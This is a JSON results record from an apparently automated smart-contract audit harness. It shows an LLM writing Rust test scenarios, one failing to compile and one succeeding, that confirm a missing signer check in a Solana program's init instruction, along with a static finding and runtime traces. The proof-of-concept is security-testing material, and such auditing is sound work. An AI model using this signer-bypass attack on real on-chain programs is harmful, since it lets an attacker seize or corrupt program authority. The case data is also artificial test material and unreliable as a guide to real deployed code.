@@ -1,0 +1,135 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: config inicializada sem assinatura da autoridade",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2375,
+        "completion_tokens": 611,
+        "latency_s": 3.74
+      },
+      "raw": "{\n  \"plan\": \"O programa `init` (Pinocchio) espera duas contas: `config` (gravável, com pelo menos 49 bytes) e `authority`. O baseline chama `init` com a autoridade legítima assinando, provando que o cenário está montado corretamente. O ataque repete a mesma chamada, mas remove a assinatura da autoridade (a conta `authority` deixa de ser signer), mantendo a mesma chave pública. O efeito medido é que a config foi inicializada (byte 40 == 1) e a autoridade gravada é a chave fornecida sem assinatura, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.\",\n  \"scenario\": \"let config_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet config_data = vec![0u8; 49];\\nlet config_account = account(&env.program_id, &config_data, None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority_key, true),\\n];\\nlet ix = env.raw_ix(&[IX_INIT], metas);\\n\\nlet contas = vec![\\n    (config_key, config_account.clone()),\\n    (authority_key, authority_account.clone()),\\n];\\n\\nlet baseline = env.baseline(\\\"init legitimo com autoridade assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);\\n\\nlet contas_ataque = vec![\\n    (config_key, config_account),\\n    (authority_key, authority_account),\\n];\\n\\nlet r = env.attack(\\\"init sem assinatura da autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let config_depois = after(&r, &config_key);\\n    let dados = config_depois.data();\\n    let autoridade_gravada = read_pubkey(dados, 8);\\n    env.effect(\\n        \\\"config inicializada sem assinatura da autoridade\\\",\\n        dados[40] == 1 && autoridade_gravada == authority_key,\\n    );\\n}\"\n}",
+      "plan": "O programa `init` (Pinocchio) espera duas contas: `config` (gravável, com pelo menos 49 bytes) e `authority`. O baseline chama `init` com a autoridade legítima assinando, provando que o cenário está montado corretamente. O ataque repete a mesma chamada, mas remove a assinatura da autoridade (a conta `authority` deixa de ser signer), mantendo a mesma chave pública. O efeito medido é que a config foi inicializada (byte 40 == 1) e a autoridade gravada é a chave fornecida sem assinatura, demonstrando que a operação restrita foi executada sem a assinatura da autoridade.",
+      "scenario": "let config_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet config_data = vec![0u8; 49];\nlet config_account = account(&env.program_id, &config_data, None);\nlet authority_account = wallet(1_000_000_000);\n\nlet metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority_key, true),\n];\nlet ix = env.raw_ix(&[IX_INIT], metas);\n\nlet contas = vec![\n    (config_key, config_account.clone()),\n    (authority_key, authority_account.clone()),\n];\n\nlet baseline = env.baseline(\"init legitimo com autoridade assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);\n\nlet contas_ataque = vec![\n    (config_key, config_account),\n    (authority_key, authority_account),\n];\n\nlet r = env.attack(\"init sem assinatura da autoridade\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let config_depois = after(&r, &config_key);\n    let dados = config_depois.data();\n    let autoridade_gravada = read_pubkey(dados, 8);\n    env.effect(\n        \"config inicializada sem assinatura da autoridade\",\n        dados[40] == 1 && autoridade_gravada == authority_key,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `IX_INIT` in this scope\n  --> tests/attempt.rs:20:27\n   |\n20 |     let ix = env.raw_ix(&[IX_INIT], metas);\n   |                           ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_INIT` in this scope\n  --> tests/attempt.rs:33:34\n   |\n33 |     let ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `IX_INIT` in this scope\n  --> tests/attempt.rs:20:27\n   |\n20 |     let ix = env.raw_ix(&[IX_INIT], metas);\n   |                           ^^^^^^^ not found in this scope\n\nerror[E0425]: cannot find value `IX_INIT` in this scope\n  --> tests/attempt.rs:33:34\n   |\n33 |     let ix_ataque = env.raw_ix(&[IX_INIT], metas_ataque);\n   |                                  ^^^^^^^ not found in this scope\n\nFor more information about this error, try `rustc --explain E0425`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2973,
+        "completion_tokens": 573,
+        "latency_s": 3.31
+      },
+      "raw": "{\"plan\": \"Preparo uma conta config nao inicializada (49 bytes zerados, dona do programa) e uma conta authority. O baseline chama init com a authority assinando (uso legitimo). O ataque repete a mesma chamada mas com a authority sem assinar, tentando inicializar a config gravando a chave da authority sem sua assinatura. O efeito verifica que a config foi inicializada (flag em data[40]==1) e que a authority gravada em data[8..40] e a chave fornecida, apesar da ausencia de assinatura.\", \"scenario\": \"let config_key = Pubkey::new_unique();\\nlet authority_key = Pubkey::new_unique();\\n\\nlet config_data = vec![0u8; 49];\\nlet config_account = account(&env.program_id, &config_data, None);\\nlet authority_account = wallet(1_000_000_000);\\n\\nlet metas = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority_key, true),\\n];\\nlet ix = env.raw_ix(&[1u8], metas);\\n\\nlet contas = vec![\\n    (config_key, config_account.clone()),\\n    (authority_key, authority_account.clone()),\\n];\\n\\nlet _baseline = env.baseline(\\\"init legitimo com autoridade assinando\\\", &ix, &contas);\\n\\nlet metas_ataque = vec![\\n    AccountMeta::new(config_key, true),\\n    AccountMeta::new_readonly(authority_key, false),\\n];\\nlet ix_ataque = env.raw_ix(&[1u8], metas_ataque);\\n\\nlet contas_ataque = vec![\\n    (config_key, config_account),\\n    (authority_key, authority_account),\\n];\\n\\nlet r = env.attack(\\\"init sem assinatura da autoridade\\\", &ix_ataque, &contas_ataque);\\n\\nif r.program_result == ProgramResult::Success {\\n    let config_depois = after(&r, &config_key);\\n    let dados = config_depois.data();\\n    let autoridade_gravada = read_pubkey(dados, 8);\\n    env.effect(\\n        \\\"config inicializada sem assinatura da autoridade\\\",\\n        dados[40] == 1 && autoridade_gravada == authority_key,\\n    );\\n}\"}",
+      "plan": "Preparo uma conta config nao inicializada (49 bytes zerados, dona do programa) e uma conta authority. O baseline chama init com a authority assinando (uso legitimo). O ataque repete a mesma chamada mas com a authority sem assinar, tentando inicializar a config gravando a chave da authority sem sua assinatura. O efeito verifica que a config foi inicializada (flag em data[40]==1) e que a authority gravada em data[8..40] e a chave fornecida, apesar da ausencia de assinatura.",
+      "scenario": "let config_key = Pubkey::new_unique();\nlet authority_key = Pubkey::new_unique();\n\nlet config_data = vec![0u8; 49];\nlet config_account = account(&env.program_id, &config_data, None);\nlet authority_account = wallet(1_000_000_000);\n\nlet metas = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority_key, true),\n];\nlet ix = env.raw_ix(&[1u8], metas);\n\nlet contas = vec![\n    (config_key, config_account.clone()),\n    (authority_key, authority_account.clone()),\n];\n\nlet _baseline = env.baseline(\"init legitimo com autoridade assinando\", &ix, &contas);\n\nlet metas_ataque = vec![\n    AccountMeta::new(config_key, true),\n    AccountMeta::new_readonly(authority_key, false),\n];\nlet ix_ataque = env.raw_ix(&[1u8], metas_ataque);\n\nlet contas_ataque = vec![\n    (config_key, config_account),\n    (authority_key, authority_account),\n];\n\nlet r = env.attack(\"init sem assinatura da autoridade\", &ix_ataque, &contas_ataque);\n\nif r.program_result == ProgramResult::Success {\n    let config_depois = after(&r, &config_key);\n    let dados = config_depois.data();\n    let autoridade_gravada = read_pubkey(dados, 8);\n    env.effect(\n        \"config inicializada sem assinatura da autoridade\",\n        dados[40] == 1 && autoridade_gravada == authority_key,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo com autoridade assinando",
+            "result": "Success",
+            "compute_units": 276,
+            "account_flags": "sw,sr",
+            "ix_head": "01",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "01020304050607080000000000000003000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "init sem assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 276,
+            "account_flags": "sw,-r",
+            "ix_head": "01",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 49,
+                "head": "0000000000000000",
+                "digest": "78877fa898f0b4c4",
+                "post": "01020304050607080000000000000003000000000000000000000000000000000000000000000000010000000000000000"
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "config inicializada sem assinatura da autoridade",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 276 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 276 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: config inicializada sem assinatura da autoridade"
+    }
+  ],
+  "case_id": "SSP-04-P-S",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "let authority = &accounts[1];\n...\ndata[8..40].copy_from_slice(authority.key().as_ref());",
+    "explanation": "A conta `authority` e recebida como `AccountInfo` e sua chave publica e gravada como autoridade da config sem qualquer verificacao de que ela assinou a transacao (`authority.is_signer`). Nao ha tipo `Signer` nem `require!(authority.is_signer, ...)`.",
+    "attack_hypothesis": "Um atacante fornece a chave publica de uma autoridade legitima (ou qualquer chave) como `accounts[1]` sem possuir a chave privada correspondente, inicializando a config com uma autoridade que ele nao controla ou, pior, definindo-se como autoridade sem assinar."
+  }
+}
